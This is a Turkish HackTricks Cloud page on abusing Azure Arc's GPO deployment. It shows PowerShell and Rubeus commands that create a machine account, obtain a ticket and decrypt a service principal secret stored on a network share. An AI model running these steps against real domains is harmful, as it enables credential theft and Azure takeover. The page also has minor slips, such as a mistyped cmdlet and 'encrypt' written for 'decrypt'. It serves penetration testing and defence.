# Az - Azure Arc Kırılgan GPO Dağıtma Betiği

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) ile sıfırdan kahramana kadar AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

- **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na (https://github.com/sponsors/carlospolop) göz atın!
- [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family)
- **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'da takip edin.**
- **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

### Sorunları Tanımlama

Azure Arc, yeni iç sunucuların (katılmış etki alanı sunucuları) Azure Arc'a Grup İlke Nesnesi yöntemiyle entegrasyonuna olanak tanır. Bu işlemi kolaylaştırmak için Microsoft, başlatma işlemi için gerekli dağıtım araçlarını sağlar. ArcEnableServerGroupPolicy.zip dosyası içinde DeployGPO.ps1, EnableAzureArc.ps1 ve AzureArcDeployment.psm1 betikleri bulunabilir.

Çalıştırıldığında, DeployGPO.ps1 betiği aşağıdaki işlemleri gerçekleştirir:

1. Yerel etki alanında Azure Arc Sunucuları Katılımı GPO'sunu oluşturur.
2. Onboarding işlemi için oluşturulan belirli ağ paylaşımına EnableAzureArc.ps1 onboarding betiğini kopyalar; bu paylaşım aynı zamanda Windows yükleyici paketini içerir.

Bu betiği çalıştırırken sistem yöneticilerinin **ServicePrincipalId** ve **ServicePrincipalClientSecret** olmak üzere iki ana parametreyi sağlamaları gerekir. Ayrıca, etki alanı, paylaşımı barındıran sunucunun FQDN'si ve paylaşım adı gibi diğer parametreler de gereklidir. Betiğe ayrıca kiracı kimliği, kaynak grubu ve diğer gerekli bilgiler de sağlanmalıdır.

DPAPI-NG şifrelemesi kullanılarak belirtilen paylaşımdaki AzureArcDeploy dizininde şifrelenmiş bir gizli oluşturulur. Şifrelenmiş gizli, encryptedServicePrincipalSecret adlı bir dosyada saklanır. Bu şifrelemenin, betik yorumlarında belirtildiği gibi, Domain Computer ve Domain Controller grup SIDs'ini içeren bir tanımlayıcı ile gerçekleştirildiği DeployGPO.ps1 betiğinde bulunan kanıtlardan anlaşılabilir. Bu, ServicePrincipalSecret'in yalnızca Etki Alanı Denetleyicileri ve Etki Alanı Bilgisayarları güvenlik grupları tarafından şifresinin çözülebileceğini sağlar.
```powershell
# Encrypting the ServicePrincipalSecret to be decrypted only by the Domain Controllers and the Domain Computers security groups
$DomainComputersSID = "SID=" + $DomainComputersSID
$DomainControllersSID = "SID=" + $DomainControllersSID
$descriptor = @($DomainComputersSID, $DomainControllersSID) -join " OR "
Import-Module $PSScriptRoot\AzureArcDeployment.psm1
$encryptedSecret = [DpapiNgUtil]::ProtectBase64($descriptor, $ServicePrincipalSecret)
```
### Sızma

Aşağıdaki koşullara sahibiz:

1. İç ağı başarılı bir şekilde ele geçirdik.
2. Active Directory içinde bir bilgisayar hesabı oluşturma veya kontrolünü ele geçirme yeteneğine sahibiz.
3. AzureArcDeploy dizinini içeren bir ağ paylaşımı keşfettik.

Bir AD ortamında bir makine hesabı elde etmenin birkaç yöntemi vardır. En yaygın olanlardan biri makine hesabı kotasını sömürmektir. Başka bir yöntem, zayıf ACL'ler veya çeşitli diğer yapılandırmalar aracılığıyla bir makine hesabını tehlikeye atmak içindir.
```powershell
Import-MKodule powermad
New-MachineAccount -MachineAccount fake01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
Bir makine hesabı elde edildiğinde, bu hesap kullanılarak kimlik doğrulaması yapmak mümkündür. Ya runas.exe komutunu netonly bayrağı ile kullanabiliriz ya da Rubeus.exe ile bilet geçirme yöntemini kullanabiliriz.
```powershell
runas /user:fake01$ /netonly powershell
```

```powershell
.\Rubeus.exe asktgt /user:fake01$ /password:123456 /prr
```
Bilgisayar hesabımız için TGT'nin bellekte saklanmasıyla, aşağıdaki betiği kullanarak hizmet başkanı sırrını şifreleyebiliriz.
```powershell
Import-Module .\AzureArcDeployment.psm1

$encryptedSecret = Get-Content "[shared folder path]\AzureArcDeploy\encryptedServicePrincipalSecret"

$ebs = [DpapiNgUtil]::UnprotectBase64($encryptedSecret)
$ebs
```
Alternatif olarak, [SecretManagement.DpapiNG](https://github.com/jborean93/SecretManagement.DpapiNG) kullanabiliriz.

Bu noktada, Azure'a bağlanmak için gerekli kalan bilgileri ArcInfo.json dosyasından toplayabiliriz. Bu dosya, şifrelenmiş Service Principal Secret dosyasıyla aynı ağ paylaşımında saklanmaktadır. Bu dosya, TenantId, servicePrincipalClientId, ResourceGroup ve daha fazlası gibi detayları içerir. Bu bilgilerle, etkilenmiş servis prensibi olarak Azure CLI kullanabiliriz.

## Referanslar

- [https://xybytes.com/azure/Abusing-Azure-Arc/](https://xybytes.com/azure/Abusing-Azure-Arc/)
